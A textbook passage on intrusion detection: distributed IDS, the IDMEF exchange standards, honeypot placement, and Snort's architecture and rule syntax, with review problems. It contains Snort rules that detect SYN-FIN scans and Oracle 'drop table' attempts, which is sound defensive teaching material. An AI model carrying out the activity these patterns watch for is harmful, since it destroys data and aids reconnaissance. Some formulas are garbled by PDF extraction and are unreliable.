297\\r\\nNIST SP 800-94 notes that a distributed or hybrid IDS can be constructed using \\r\\nmultiple products from a single vendor, designed to share and exchange data. This is \\r\\nclearly an easier, but may not be the most cost-effective or comprehensive solution. \\r\\nAlternatively, specialized security information and event management (SIEM) soft\\ufffeware exists that can import and analyze data from a variety of sources, sensors, and \\r\\nproducts. Such software may well rely on standardized protocols, such as Intrusion \\r\\nDetection Exchange Format we will discuss in the next section. An analogy may help \\r\\nclarify the advantage of this distributed approach. Suppose a single host is subject to \\r\\na prolonged attack, and the host is configured to minimize false positives. Early on in \\r\\nthe attack, no alert is sounded because the risk of false positive is high. If the attack \\r\\npersists, the evidence that an attack is under way becomes stronger and the risk of \\r\\nfalse positive decreases. However, much time has passed. Now, consider many local \\r\\nsensors, each of which suspect the onset of an attack and all of which collaborate. \\r\\nBecause numerous systems see the same evidence, an alert can be issued with a low \\r\\nfalse positive risk. Thus, instead of a long period of time, we use a large number of \\r\\nsensors to reduce false positives and still detect attacks. A number of vendors now \\r\\noffer this type of product.\\r\\nWe now summarize the principal elements of this approach, illustrated in \\r\\nFigure 8.6. A central system is configured with a default set of security policies. Based \\r\\non input from distributed sensors, these policies are adapted and specific actions are \\r\\ncommunicated to the various platforms in the distributed system. The device-specific \\r\\npolicies may include immediate actions to take or parameter settings to be adjusted. \\r\\nThe central system also communicates collaborative policies to all platforms that \\r\\nadjust the timing and content of collaborative gossip messages. Three types of input \\r\\nguide the actions of the central system:\\r\\n• Summary events: Events from various sources are collected by intermediate \\r\\ncollection points such as firewalls, IDSs, or servers that serve a specific seg\\ufffement of the enterprise network. These events are summarized for delivery to \\r\\nthe central policy system.\\r\\n• DDI events: Distributed detection and inference (DDI) events are alerts that \\r\\nare generated when the gossip traffic enables a platform to conclude that an \\r\\nattack is under way.\\r\\n• PEP events: Policy enforcement points (PEPs) reside on trusted, self-defending \\r\\nplatforms and intelligent IDSs. These systems correlate distributed information, \\r\\nlocal decisions, and individual device actions to detect intrusions that may not \\r\\nbe evident at the host level.\\r\\n8.7 INTRUSION DETECTION EXCHANGE FORMAT\\r\\nTo facilitate the development of distributed IDSs that can function across a wide \\r\\nrange of platforms and environments, standards are needed to support interoper\\ufffeability. Such standards are the focus of the IETF Intrusion Detection Working Group. \\r\\nThe purpose of the working group is to define data formats and exchange procedures \\r\\nfor sharing information of interest to intrusion detection and response systems and to \\r\\nM08_STAL0611_04_GE_C08.indd 297 10/11/17 2:55 PM\\n\\n\\n298 CHAPTER 8 / INTRUSION DETECTION\\r\\nmanagement systems that may need to interact with them. The working group issued \\r\\nthe following RFCs in 2007:\\r\\n• Intrusion Detection Message Exchange Requirements (RFC 4766): This docu\\ufffement defines requirements for the Intrusion Detection Message Exchange For\\ufffemat (IDMEF). The document also specifies requirements for a communication \\r\\nprotocol for communicating IDMEF.\\r\\n• The Intrusion Detection Message Exchange Format (RFC 4765): This document \\r\\ndescribes a data model to represent information exported by intrusion detection \\r\\nsystems and explains the rationale for using this model. An implementation of \\r\\nthe data model in the Extensible Markup Language (XML) is presented, an \\r\\nXML Document Type Definition is developed, and examples are provided.\\r\\n• The Intrusion Detection Exchange Protocol (RFC 4767): This document \\r\\ndescribes the Intrusion Detection Exchange Protocol (IDXP), an application\\ufffelevel protocol for exchanging data between intrusion detection entities. IDXP \\r\\nsupports mutual-authentication, integrity, and confidentiality over a connec\\ufffetion-oriented protocol.\\r\\nFigure 8.7 illustrates the key elements of the model on which the intrusion \\r\\ndetection message exchange approach is based. This model does not correspond to \\r\\nFigure 8.7 Model for Intrusion Detection Message Exchange\\r\\nResponse\\r\\nActivity\\r\\nEvent\\r\\nEvent\\r\\nAlert\\r\\nNotification\\r\\nOperator\\r\\nAdministrator\\r\\nSecurity\\r\\npolicy\\r\\nSecurity\\r\\npolicy\\r\\nM08_STAL0611_04_GE_C08.indd 298 10/11/17 2:55 PM\\n\\n\\n8.7 / INTRUSION DETECTION EXCHANGE FORMAT 299\\r\\nany particular product or implementation, but its functional components are the key \\r\\nelements of any IDS. The functional components are as follows:\\r\\n• Data source:The raw data that an IDS uses to detect unauthorized or undesired \\r\\nactivity. Common data sources include network packets, operating system audit \\r\\nlogs, application audit logs, and system-generated checksum data.\\r\\n• Sensor: Collects data from the data source. The sensor forwards events to the \\r\\nanalyzer.\\r\\n• Analyzer: The ID component or process that analyzes the data collected by the \\r\\nsensor for signs of unauthorized or undesired activity or for events that might \\r\\nbe of interest to the security administrator. In many existing IDSs, the sensor \\r\\nand the analyzer are part of the same component.\\r\\n• Administrator: The human with overall responsibility for setting the security \\r\\npolicy of the organization, and, thus, for decisions about deploying and config\\ufffeuring the IDS. This may or may not be the same person as the operator of the \\r\\nIDS. In some organizations, the administrator is associated with the network \\r\\nor systems administration groups. In other organizations, it is an independent \\r\\nposition.\\r\\n• Manager: The ID component or process from which the operator manages the \\r\\nvarious components of the ID system. Management functions typically include \\r\\nsensor configuration, analyzer configuration, event notification management, \\r\\ndata consolidation, and reporting.\\r\\n• Operator: The human that is the primary user of the IDS manager. The opera\\ufffetor often monitors the output of the IDS and initiates or recommends further \\r\\naction.\\r\\nIn this model, intrusion detection proceeds in the following manner. The sen\\ufffesor monitors data sources looking for suspicious activity, such as network sessions \\r\\nshowing unexpected remote access activity, operating system log file entries showing \\r\\na user attempting to access files to which he or she is not authorized to have access, \\r\\nand application log files showing persistent login failures. The sensor communicates \\r\\nsuspicious activity to the analyzer as an event, which characterizes an activity within \\r\\na given period of time. If the analyzer determines that the event is of interest, it sends \\r\\nan alert to the manager component that contains information about the unusual \\r\\nactivity that was detected, as well as the specifics of the occurrence. The manager \\r\\ncomponent issues a notification to the human operator. A response can be initiated \\r\\nautomatically by the manager component or by the human operator. Examples of \\r\\nresponses include logging the activity; recording the raw data (from the data source) \\r\\nthat characterized the event; terminating a network, user, or application session; or \\r\\naltering network or system access controls. The security policy is the predefined, for\\ufffemally documented statement that defines what activities are allowed to take place \\r\\non an organization’s network or on particular hosts to support the organization’s \\r\\nrequirements. This includes, but is not limited to, which hosts are to be denied external \\r\\nnetwork access.\\r\\nThe specification defines formats for event and alert messages, message types, \\r\\nand exchange protocols for communication of intrusion detection information.\\r\\nM08_STAL0611_04_GE_C08.indd 299 10/11/17 2:55 PM\\n\\n\\n300 CHAPTER 8 / INTRUSION DETECTION\\r\\n8.8 HONEYPOTS\\r\\nA further component of intrusion detection technology is the honeypot. Honeypots \\r\\nare decoy systems that are designed to lure a potential attacker away from critical \\r\\nsystems. Honeypots are designed to:\\r\\n• Divert an attacker from accessing critical systems.\\r\\n• Collect information about the attacker’s activity.\\r\\n• Encourage the attacker to stay on the system long enough for administrators \\r\\nto respond.\\r\\nThese systems are filled with fabricated information designed to appear valu\\ufffeable but that a legitimate user of the system would not access. Thus, any access to the \\r\\nhoneypot is suspect. The system is instrumented with sensitive monitors and event \\r\\nloggers that detect these accesses and collect information about the attacker’s activi\\ufffeties. Because any attack against the honeypot is made to seem successful, adminis\\ufffetrators have time to mobilize and log and track the attacker without ever exposing \\r\\nproductive systems.\\r\\nThe honeypot is a resource that has no production value. There is no legiti\\ufffemate reason for anyone outside the network to interact with a honeypot. Thus, any \\r\\nattempt to communicate with the system is most likely a probe, scan, or attack. Con\\ufffeversely, if a honeypot initiates outbound communication, the system has probably \\r\\nbeen compromised.\\r\\nHoneypots are typically classified as being either low or high interaction.\\r\\n• Low interaction honeypot: Consists of a software package that emulates \\r\\nparticular IT services or systems well enough to provide a realistic initial \\r\\ninteraction, but does not execute a full version of those services or systems.\\r\\n• High interaction honeypot: Is a real system, with a full operating system, \\r\\nservices and applications, which are instrumented and deployed where they \\r\\ncan be accessed by attackers.\\r\\nA high interaction honeypot is a more realistic target that may occupy an \\r\\nattacker for an extended period. However, it requires significantly more resources, \\r\\nand if compromised could be used to initiate attacks on other systems. This may result \\r\\nin unwanted legal or reputational issues for the organization running it. A low interac\\ufffetion honeypot provides a less realistic target, able to identify intruders using the ear\\ufffelier stages of the attack methodology we discussed earlier in this chapter. This is often \\r\\nsufficient for use as a component of a distributed IDS to warn of imminent attack. \\r\\n“The Honeynet Project” provides a range of resources and packages for such systems.\\r\\nInitial efforts involved a single honeypot computer with IP addresses designed \\r\\nto attract hackers. More recent research has focused on building entire honeypot net\\ufffeworks that emulate an enterprise, possibly with actual or simulated traffic and data. \\r\\nOnce hackers are within the network, administrators can observe their behavior in \\r\\ndetail and figure out defenses.\\r\\nHoneypots can be deployed in a variety of locations. Figure 8.8 illustrates \\r\\nsome possibilities. The location depends on a number of factors, such as the type \\r\\nM08_STAL0611_04_GE_C08.indd 300 10/11/17 2:55 PM\\n\\n\\n8.8 / HONEYPOTS 301\\r\\nof information the organization is interested in gathering and the level of risk that \\r\\norganizations can tolerate to obtain the maximum amount of data.\\r\\nA honeypot outside the external firewall (location 1) is useful for tracking \\r\\nattempts to connect to unused IP addresses within the scope of the network. A hon\\ufffeeypot at this location does not increase the risk for the internal network. The danger \\r\\nof having a compromised system behind the firewall is avoided. Further, because the \\r\\nhoneypot attracts many potential attacks, it reduces the alerts issued by the firewall \\r\\nand by internal IDS sensors, easing the management burden. The disadvantage of an \\r\\nexternal honeypot is that it has little or no ability to trap internal attackers, especially \\r\\nif the external firewall filters traffic in both directions.\\r\\nThe network of externally available services, such as Web and mail, often called \\r\\nthe DMZ (demilitarized zone), is another candidate for locating a honeypot (location 2). \\r\\nThe security administrator must assure that the other systems in the DMZ are secure \\r\\nagainst any activity generated by the honeypot. A disadvantage of this location is that a \\r\\ntypical DMZ is not fully accessible, and the firewall typically blocks traffic to the DMZ \\r\\nFigure 8.8 Example of Honeypot Deployment\\r\\nInternet\\r\\nHoneypot\\r\\nHoneypot\\r\\n1\\r\\n3\\r\\nHoneypot\\r\\nService network\\r\\n(Web, mail, DNS, etc.)\\r\\nInternal\\r\\nnetwork\\r\\nExternal\\r\\nfirewall\\r\\nLAN switch\\r\\nor router\\r\\nLAN switch\\r\\nor router\\r\\n2\\r\\nM08_STAL0611_04_GE_C08.indd 301 10/11/17 2:55 PM\\n\\n\\n302 CHAPTER 8 / INTRUSION DETECTION\\r\\nthe attempts to access unneeded services. Thus, the firewall either has to open up the traf\\ufffefic beyond what is permissible, which is risky, or limit the effectiveness of the honeypot.\\r\\nA fully internal honeypot (location 3) has several advantages. Its most important \\r\\nadvantage is that it can catch internal attacks. A honeypot at this location can also \\r\\ndetect a misconfigured firewall that forwards impermissible traffic from the Internet \\r\\nto the internal network. There are several disadvantages. The most serious of these is if \\r\\nthe honeypot is compromised so it can attack other internal systems. Any further traffic \\r\\nfrom the Internet to the attacker is not blocked by the firewall because it is regarded \\r\\nas traffic to the honeypot only. Another difficulty for this honeypot location is that, as \\r\\nwith location 2, the firewall must adjust its filtering to allow traffic to the honeypot, thus \\r\\ncomplicating firewall configuration and potentially compromising the internal network.\\r\\nAn emerging related technology is the use of honeyfiles, that emulate legiti\\ufffemate documents with realistic, enticing names and possibly content. These docu\\ufffements should not be accessed by legitimate users of a system, but rather act as bait \\r\\nfor intruders exploring a system. Any access of them is assumed to be suspicious \\r\\n[WHIT13]. Appropriate generation, placement, and monitoring of honeyfiles is an \\r\\narea of current research.\\r\\n8.9 EXAMPLE SYSTEM: SNORT\\r\\nSnort is an open source, highly configurable and portable host-based or network-based \\r\\nIDS. Snort is referred to as a lightweight IDS, which has the following characteristics:\\r\\n• Easily deployed on most nodes (host, server, router) of a network.\\r\\n• Efficient operation that uses small amount of memory and processor time.\\r\\n• Easily configured by system administrators who need to implement a specific \\r\\nsecurity solution in a short amount of time.\\r\\nSnort can perform real-time packet capture, protocol analysis, and content search\\ufffeing and matching. Snort is mainly designed to analyze TCP, UDP, and ICMP net\\ufffework protocols, though it can be extended with plugins for other protocols. Snort can \\r\\ndetect a variety of attacks and probes, based on a set of rules configured by a system \\r\\nadministrator.\\r\\nSnort Architecture\\r\\nA Snort installation consists of four logical components (see Figure 8.9):\\r\\n• Packet decoder: The packet decoder processes each captured packet to identify \\r\\nand isolate protocol headers at the data link, network, transport, and applica\\ufffetion layers. The decoder is designed to be as efficient as possible and its primary \\r\\nwork consists of setting pointers so that the various protocol headers can be \\r\\neasily extracted.\\r\\n• Detection engine: The detection engine does the actual work of intrusion \\r\\ndetection. This module analyzes each packet based on a set of rules defined \\r\\nfor this configuration of Snort by the security administrator. In essence, each \\r\\npacket is checked against all the rules to determine if the packet matches the \\r\\nM08_STAL0611_04_GE_C08.indd 302 10/11/17 2:55 PM\\n\\n\\n8.9 / EXAMPLE SYSTEM: SNORT 303\\r\\ncharacteristics defined by a rule. The first rule that matches the decoded packet \\r\\ntriggers the action specified by the rule. If no rule matches the packet, the detec\\ufffetion engine discards the packet.\\r\\n• Logger: For each packet that matches a rule, the rule specifies what logging \\r\\nand alerting options are to be taken. When a logger option is selected, the log\\ufffeger stores the detected packet in human readable format or in a more compact \\r\\nbinary format in a designated log file. The security administrator can then use \\r\\nthe log file for later analysis.\\r\\n• Alerter: For each detected packet, an alert can be sent. The alert option in the \\r\\nmatching rule determines what information is included in the event notification. \\r\\nThe event notification can be sent to a file, to a UNIX socket, or to a database. \\r\\nAlerting may also be turned off during testing or penetration studies. Using \\r\\nthe UNIX socket, the alert can be sent to a management machine elsewhere \\r\\non the network.\\r\\nA Snort implementation can be configured as a passive sensor, which moni\\ufffetors traffic but is not in the main transmission path of the traffic, or an inline sen\\ufffesor, through which all packet traffic must pass. In the latter case, Snort can perform \\r\\nintrusion prevention as well as intrusion detection. We defer a discussion of intrusion \\r\\nprevention to Chapter 9.\\r\\nSnort Rules\\r\\nSnort uses a simple, flexible rule definition language that generates the rules used by \\r\\nthe detection engine. Although the rules are simple and straightforward to write, they \\r\\nare powerful enough to detect a wide variety of hostile or suspicious traffic.\\r\\nEach rule consists of a fixed header and zero or more options (see Figure 8.10). \\r\\nThe header has the following elements:\\r\\n• Action: The rule action tells Snort what to do when it finds a packet that matches \\r\\nthe rule criteria. Table 8.3 lists the available actions. The last three actions in the \\r\\nlist (drop, reject, sdrop) are only available in inline mode.\\r\\nFigure 8.9 Snort Architecture\\r\\nPacket Decoder Detection\\r\\nengine\\r\\nLog\\r\\nAlert\\r\\nM08_STAL0611_04_GE_C08.indd 303 10/11/17 2:55 PM\\n\\n\\n304 CHAPTER 8 / INTRUSION DETECTION\\r\\n• Protocol: Snort proceeds in the analysis if the packet protocol matches this \\r\\nfield. The current version of Snort (2.9) recognizes four protocols: TCP, UDP, \\r\\nICMP, and IP. Future releases of Snort will support a greater range of protocols.\\r\\n• Source IP address: Designates the source of the packet. The rule may specify a \\r\\nspecific IP address, any IP address, a list of specific IP addresses, or the negation \\r\\nof a specific IP address or list. The negation indicates that any IP address other \\r\\nthan those listed is a match.\\r\\n• Source port:This field designates the source port for the specified protocol (e.g., \\r\\na TCP port). Port numbers may be specified in a number of ways, including \\r\\nspecific port number, any ports, static port definitions, ranges, and by negation.\\r\\n• Direction: This field takes on one of two values: unidirectional (- 7) or bidi\\uffferectional (6-7). The bidirectional option tells Snort to consider the address/\\r\\nport pairs in the rule as either source followed by destination or destination \\r\\nfollowed by source. The bidirectional option enables Snort to monitor both \\r\\nsides of a conversation.\\r\\n• Destination IP address: Designates the destination of the packet.\\r\\n• Destination port: Designates the destination port.\\r\\nFollowing the rule header may be one or more rule options. Each option con\\ufffesists of an option keyword, which defines the option; followed by arguments, which \\r\\nspecify the details of the option. In the written form, the set of rule options is sep\\ufffearated from the header by being enclosed in parentheses. Snort rule options are \\r\\nAction Description\\r\\nalert Generate an alert using the selected alert method, and then log the packet.\\r\\nlog Log the packet.\\r\\npass Ignore the packet.\\r\\nactivate Alert and then turn on another dynamic rule.\\r\\ndynamic Remain idle until activated by an activate rule, then act as a log rule.\\r\\ndrop Make iptables drop the packet and log the packet.\\r\\nreject Make iptables drop the packet, log it, then send a TCP reset if the protocol is \\r\\nTCP or an ICMP port unreachable message if the protocol is UDP.\\r\\nsdrop Make iptables drop the packet but does not log it.\\r\\nTable 8.3 Snort Rule Actions\\r\\nFigure 8.10 Snort Rule Formats\\r\\nAction Protocol Source \\r\\nIP address\\r\\nSource \\r\\nport\\r\\nDirection Dest \\r\\nIP address\\r\\nDest port\\r\\nOption \\r\\nkeyword\\r\\nOption \\r\\narguments .\\xa0\\xa0.\\xa0\\xa0.\\r\\n(a) Rule header\\r\\n(b) Options\\r\\nM08_STAL0611_04_GE_C08.indd 304 10/11/17 2:55 PM\\n\\n\\n8.9 / EXAMPLE SYSTEM: SNORT 305\\r\\nseparated from each other using the semicolon (;) character. Rule option keywords \\r\\nare separated from their arguments with a colon (:) character.\\r\\nThere are four major categories of rule options:\\r\\n• Meta-data: Provide information about the rule but do not have any affect dur\\ufffeing detection.\\r\\n• Payload: Look for data inside the packet payload and can be interrelated.\\r\\n• Non-payload: Look for non-payload data.\\r\\n• Post-detection: Rule-specific triggers that happen after a rule has matched a \\r\\npacket.\\r\\nTable 8.4 provides examples of options in each category.\\r\\nmeta-data\\r\\nmsg Defines the message to be sent when a packet generates an event.\\r\\nreference Defines a link to an external attack identification system, which provides additional \\r\\ninformation.\\r\\nclasstype Indicates what type of attack the packet attempted.\\r\\npayload\\r\\ncontent Enables Snort to perform a case-sensitive search for specific content (text and/or \\r\\nbinary) in the packet payload.\\r\\ndepth Specifies how far into a packet Snort should search for the specified pattern. Depth \\r\\nmodifies the previous content keyword in the rule.\\r\\noffset Specifies where to start searching for a pattern within a packet. Offset modifies the \\r\\nprevious content keyword in the rule.\\r\\nnocase Snort should look for the specific pattern, ignoring case. Nocase modifies the previ\\ufffeous content keyword in the rule.\\r\\nnon-payload\\r\\nttl Check the IP time-to-live value. This option was intended for use in the detection of \\r\\ntraceroute attempts.\\r\\nid Check the IP ID field for a specific value. Some tools (exploits, scanners and other \\r\\nodd programs) set this field specifically for various purposes, for example, the value \\r\\n31337 is very popular with some hackers.\\r\\ndsize Test the packet payload size. This may be used to check for abnormally sized packets. \\r\\nIn many cases, it is useful for detecting buffer overflows.\\r\\nflags Test the TCP flags for specified settings.\\r\\nseq Look for a specific TCP header sequence number.\\r\\nicmp-id Check for a specific ICMP ID value. This is useful because some covert channel pro\\ufffegrams use static ICMP fields when they communicate. This option was developed to \\r\\ndetect the stacheldraht DDoS agent.\\r\\npost-detection\\r\\nlogto Log packets matching the rule to the specified filename.\\r\\nsession Extract user data from TCP Sessions. There are many cases where seeing what users \\r\\nare typing in telnet, rlogin, ftp, or even web sessions is very useful.\\r\\nTable 8.4 Examples of Snort Rule Options\\r\\nM08_STAL0611_04_GE_C08.indd 305 10/11/17 2:55 PM\\n\\n\\n306 CHAPTER 8 / INTRUSION DETECTION\\r\\nHere is an example of a Snort rule:\\r\\nAlert tcp $EXTERNAL_NET any -> $HOME_NET any\\\\\\r\\n(msg: “SCAN SYN FIN” flags: SF, 12;\\\\\\r\\nreference: arachnids, 198; classtype: attempted-recon;)\\r\\nIn Snort, the reserved backslash character “\\\\” is used to write instructions on \\r\\nmultiple lines. This example is used to detect a type of attack at the TCP level known \\r\\nas a SYN-FIN attack. The names $EXTERNAL_NET and $HOME_NET are pre\\ufffedefined variable names to specify particular networks. In this example, any source \\r\\nport or destination port is specified. This example checks if just the SYN and the FIN \\r\\nbits are set, ignoring reserved bit 1 and reserved bit 2 in the flags octet. The reference \\r\\noption refers to an external definition of this attack, which is of type attempted-recon.\\r\\n8.10 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\nanomaly detection\\r\\nbanner grabbing\\r\\nbase-rate fallacy\\r\\nfalse negative\\r\\nfalse positive\\r\\nhacker\\r\\nhoneypot\\r\\nhost-based IDS\\r\\ninline sensor\\r\\nintruder\\r\\nintrusion detection\\r\\nintrusion detection exchange \\r\\nformat\\r\\nintrusion detection system \\r\\n(IDS)\\r\\nnetwork-based IDS (NIDS)\\r\\nnetwork sensor\\r\\npassive sensor\\r\\nrule-based anomaly detection\\r\\nrule-based heuristic \\r\\nidentification\\r\\nrule-based penetration\\r\\nidentification\\r\\nsecurity intrusion\\r\\nscanning\\r\\nsignature approaches\\r\\nsignature detection\\r\\nSnort\\r\\nReview Questions\\r\\n8.1 List and briefly define the skill level of intruders.\\r\\n8.2 List five examples of intrusion.\\r\\n8.3 How are intruders classified according to skill level?\\r\\n8.4 What is meant by security intrusion?\\r\\n8.5 List and breifly describe the classifications of intrusion detection systems based on the \\r\\nsource and the type of data analyzed.\\r\\n8.6 What are three benefits that can be provided by an IDS?\\r\\n8.7 What is the difference between a false positive and a false negative in the context of \\r\\nan IDS?\\r\\n8.8 Explain the base-rate fallacy.\\r\\n8.9 List some desirable characteristics of an IDS.\\r\\n8.10 What is the difference between anomaly detection and signature or heuristic intrusion \\r\\ndetection?\\r\\nM08_STAL0611_04_GE_C08.indd 306 10/11/17 2:55 PM\\n\\n\\n8.10 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 307\\r\\n8.11 List and briefly define the three broad categories of classification approaches used by \\r\\nanomaly detection systems.\\r\\n8.12 List the advantages of using machine-learning approaches for anomaly detection.\\r\\n8.13 What is the difference between signature detection and rule-based heuristic identification?\\r\\n8.14 What is the major advantage of HIDS over NIDSs and firewalls?\\r\\n8.15 Which of anomaly HIDS or signature and heuristic HIDS are currently more com\\ufffemonly deployed? Why?\\r\\n8.16 What advantages do a Distributed HIDS provide over a single system HIDS?\\r\\n8.17 Describe the types of sensors that can be used in a NIDS.\\r\\n8.18 What are the advantages of locating the NIDS sensor inside the external firewall?\\r\\n8.19 Are either anomaly detection or signature and heuristic detection techniques or both \\r\\nused in NIDS?\\r\\n8.20 What are some motivations for using a distributed or hybrid IDS?\\r\\n8.21 What is SNORT? What are the logical components of a SNORT installation?\\r\\n8.22 List four logical components of Snort architecture.\\r\\nProblems\\r\\n8.1 Consider the first step of the common attack methodology we describe, which is to \\r\\ngather publicly available information on possible targets. What types of information \\r\\ncould be used? What does this use suggest to you about the content and detail of \\r\\nsuch information? How does this correlate with the organization’s business and legal \\r\\nrequirements? How do you reconcile these conflicting demands?\\r\\n8.2 In the context of an IDS, we define a false positive to be an alarm generated by an IDS \\r\\nin which the IDS alerts to a condition that is actually benign. A false negative occurs \\r\\nwhen an IDS fails to generate an alarm when an alert-worthy condition is in effect. \\r\\nUsing the following diagram, depict two curves that roughly indicate false positives \\r\\nand false negatives, respectively:\\r\\nFrequency\\r\\nof alerts\\r\\nLess specific\\r\\nor looser\\r\\nConservativeness\\r\\nof signatures\\r\\nMore specific\\r\\nor stricter\\r\\n8.3 Inline sensors are inserted into a network segment so that the traffic being monitored \\r\\npasses through them. These sensors perform both intrusion detection and intrusion \\r\\nprevention functions. However, passive sensors are more commonly used. Why?\\r\\nM08_STAL0611_04_GE_C08.indd 307 10/11/17 2:55 PM\\n\\n\\n308 CHAPTER 8 / INTRUSION DETECTION\\r\\n8.4 One of the non-payload options in Snort is flow. This option distinguishes between \\r\\nclients and servers. This option can be used to specify a match only for packets flow\\ufffeing in one direction (client to server or vice-versa) and can specify a match only on \\r\\nestablished TCP connections. Consider the following Snort rule:\\r\\nalert tcp $EXTERNAL_NET any -> $SQL_SERVERS $ORACLE_PORTS\\\\\\r\\n(msg: “ORACLE drop table attempt:;\\\\\\r\\nflow: to_server, established; content: “drop table_name”; \\r\\nnocase;\\\\\\r\\nclasstype: protocol-command-decode;)\\r\\na. What does this rule do?\\r\\nb. Comment on the significance of this rule if the Snort devices is placed inside or \\r\\noutside of the external firewall.\\r\\n8.5 The overlapping area of the two probability density functions of Figure 8.1 repre\\ufffesents the region in which there is the potential for false positives and false negatives. \\r\\nFurther, Figure 8.1 is an idealized and not necessarily representative depiction of the \\r\\nrelative shapes of the two density functions. Suppose there is 1 actual intrusion for \\r\\nevery 1000 authorized users, and the overlapping area covers 1% of the authorized \\r\\nusers and 50% of the intruders.\\r\\na. Sketch such a set of density functions and argue that this is not an unreasonable \\r\\ndepiction.\\r\\nb. What is the probability that an event that occurs in this region is that of an autho\\uffferized user? Keep in mind that 50% of all intrusions fall in this region.\\r\\n8.6 An example of a host-based intrusion detection tool is the tripwire program. This is \\r\\na file integrity checking tool that scans files and directories on the system on a regu\\ufffelar basis and notifies the administrator of any changes. It uses a protected database \\r\\nof cryptographic checksums for each file checked and compares this value with that \\r\\nrecomputed on each file as it is scanned. It must be configured with a list of files and \\r\\ndirectories to check and what changes, if any, are permissible to each. It can allow, \\r\\nfor example, log files to have new entries appended, but not for existing entries to be \\r\\nchanged. What are the advantages and disadvantages of using such a tool? Consider \\r\\nthe problem of determining which files should only change rarely, which files may \\r\\nchange more often and how, and which change frequently and hence cannot be \\r\\nchecked. Consider the amount of work in both the configuration of the program and \\r\\non the system administrator monitoring the responses generated.\\r\\n8.7 A decentralized NIDS is operating with two nodes in the network monitoring anoma\\ufffelous inflows of traffic. In addition, a central node is present, to generate an alarm \\r\\nsignal upon receiving input signals from the two distributed nodes. The signatures of \\r\\ntraffic inflow into the two IDS nodes follow one of four patterns: P1, P2, P3, and P4. \\r\\nThe threat levels are classified by the central node based upon the observed traffic by \\r\\nthe two NIDS at a given time and are given by the following table:\\r\\nThreat Level Signature\\r\\nLow 1 P1 + 1 P2\\r\\nMedium 1 P3 + 1 P4\\r\\nHigh 2 P4\\r\\nIf, at a given time instance, at least one distributed node generates an alarm signal P3, \\r\\nwhat is the probability that the observed traffic in the network will be classified at \\r\\nthreat level “Medium”?\\r\\nM08_STAL0611_04_GE_C08.indd 308 10/11/17 2:55 PM\\n\\n\\n8.10 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 309\\r\\n8.8 A taxicab was involved in a fatal hit-and-run accident at night. Two cab companies, the \\r\\nGreen and the Blue, operate in the city. You are told that\\r\\n• 85% of the cabs in the city are Green and 15% are Blue.\\r\\n• A witness identified the cab as Blue.\\r\\nThe court tested the reliability of the witness under the same circumstances that \\r\\nexisted on the night of the accident and concluded that the witness was correct in \\r\\nidentifying the color of the cab 80% of the time. What is the probability that the cab \\r\\ninvolved in the incident was Blue rather than Green?\\r\\nPr[A! B] = Pr[AB]\\r\\nPr[B]\\r\\nPr[A! B] = 1/12\\r\\n3/4 = 1\\r\\n9\\r\\nPr[A] = a\\r\\nn\\r\\ni=1\\r\\n Pr[A! Ei\\r\\n] Pr[Ei\\r\\n]\\r\\nPr[Ei !A] = Pr[A! Ei\\r\\n]P[Ei\\r\\n]\\r\\nPr[A] = Pr[A! Ei\\r\\n]P[Ei\\r\\n]\\r\\na\\r\\nn\\r\\nj=1\\r\\nPr[A! Ej\\r\\n]Pr[Ej\\r\\n]\\r\\nM08_STAL0611_04_GE_C08.indd 309 10/11/17 2:55 PM\\n\\n\\n9.1 The Need for Firewalls\\r\\n9.2 Firewall Characteristics and Access Policy\\r\\n9.3 Types of Firewalls\\r\\nPacket Filtering Firewall\\r\\nStateful Inspection Firewalls\\r\\nApplication-Level Gateway\\r\\nCircuit-Level Gateway\\r\\n9.4 Firewall Basing\\r\\nBastion Host\\r\\nHost-Based Firewalls\\r\\nPersonal Firewall\\r\\n9.5 Firewall Location and Configurations\\r\\nDMZ Networks\\r\\nVirtual Private Networks\\r\\nDistributed Firewalls\\r\\nSummary of Firewall Locations and Topologies\\r\\n9.6 Intrusion Prevention Systems\\r\\nHost-Based IPS\\r\\nNetwork-Based IPS\\r\\nDistributed or Hybrid IPS\\r\\nSnort Inline\\r\\n9.7 Example: Unified Threat Management Products\\r\\n9.8 Key Terms, Review Questions, and Problems\\r\\nFirewalls and Intrusion Prevention Systems\\r\\nCHAPTER \\r\\n310\\r\\nM09_STAL0611_04_GE_C09.indd 310 10/11/17 2:59 PM\\n\\n\\n9.1 / THE NEED FOR FIREWALLS 311\\r\\nFirewalls can be an effective means of protecting a local system or network of systems \\r\\nfrom network-based security threats while at the same time affording access to the \\r\\noutside world via wide area networks and the Internet.\\r\\n9.1 THE NEED FOR FIREWALLS\\r\\nInformation systems in corporations, government agencies, and other organizations \\r\\nhave undergone a steady evolution. The following are notable developments:\\r\\n• Centralized data processing system, with a central mainframe supporting a \\r\\nnumber of directly connected terminals.\\r\\n• Local area networks (LANs) interconnecting PCs and terminals to each other \\r\\nand the mainframe.\\r\\n• Premises network, consisting of a number of LANs, interconnecting PCs, \\r\\nservers, and perhaps a mainframe or two.\\r\\n• Enterprise-wide network, consisting of multiple, geographically distributed \\r\\npremises networks interconnected by a private wide area network (WAN).\\r\\n• Internet connectivity, in which the various premises networks all hook into the \\r\\nInternet and may or may not also be connected by a private WAN.\\r\\n• Enterprise cloud computing, which we will describe further in Chapter 13, with \\r\\nvirtualized servers located in one or more data centers that can provide both \\r\\ninternal organizational and external Internet accessible services.\\r\\nInternet connectivity is no longer optional for most organizations. The infor\\ufffemation and services available are essential to the organization. Moreover, individual \\r\\nusers within the organization want and need Internet access, and if this is not pro\\ufffevided via their LAN, they could use a wireless broadband capability from their PC to \\r\\nan Internet service provider (ISP). However, while Internet access provides benefits \\r\\nto the organization, it enables the outside world to reach and interact with local net\\ufffework assets. This creates a threat to the organization. While it is possible to equip each \\r\\nworkstation and server on the premises network with strong security features, such as \\r\\nintrusion protection, this may not be sufficient, and in some cases is not cost-effective. \\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Explain the role of firewalls as part of a computer and network security \\r\\nstrategy.\\r\\n◆ List the key characteristics of firewalls.\\r\\n◆ Discuss the various basing options for firewalls.\\r\\n◆ Understand the relative merits of various choices for firewall location and \\r\\nconfigurations.\\r\\n◆ Distinguish between firewalls and intrusion prevention systems.\\r\\nM09_STAL0611_04_GE_C09.indd 311 10/11/17 2:59 PM\\n\\n\\n312 CHAPTER 9 / FIREWALLS AND INTRUSION PREVENTION SYSTEMS\\r\\nConsider a network with hundreds or even 